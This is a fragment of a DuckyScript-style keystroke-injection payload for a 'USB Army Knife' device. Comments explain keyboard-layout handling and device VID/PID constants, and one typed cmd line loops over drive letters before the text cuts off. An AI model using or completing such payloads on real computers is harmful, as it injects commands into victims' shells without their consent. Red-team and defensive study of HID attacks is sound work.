  REM By default the USB Army Knife uses a US keyboard layout and the keycodes for \ are different
  REM To get this working on a UK layout we have two choices either:
  REM * Compile in the win_en-GB locale (which we do by default) and then use the 'KEYBOARD_LAYOUT win_en-GB' command
  REM * Send manual HID codes with RAW_HID SHIFT 0x64

  REM For this example we'll use RAW_HID

  REM To run we tell the agent the VID and PID of this device. That way it knows exactly what device to talk to
  REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
  REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack

  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:
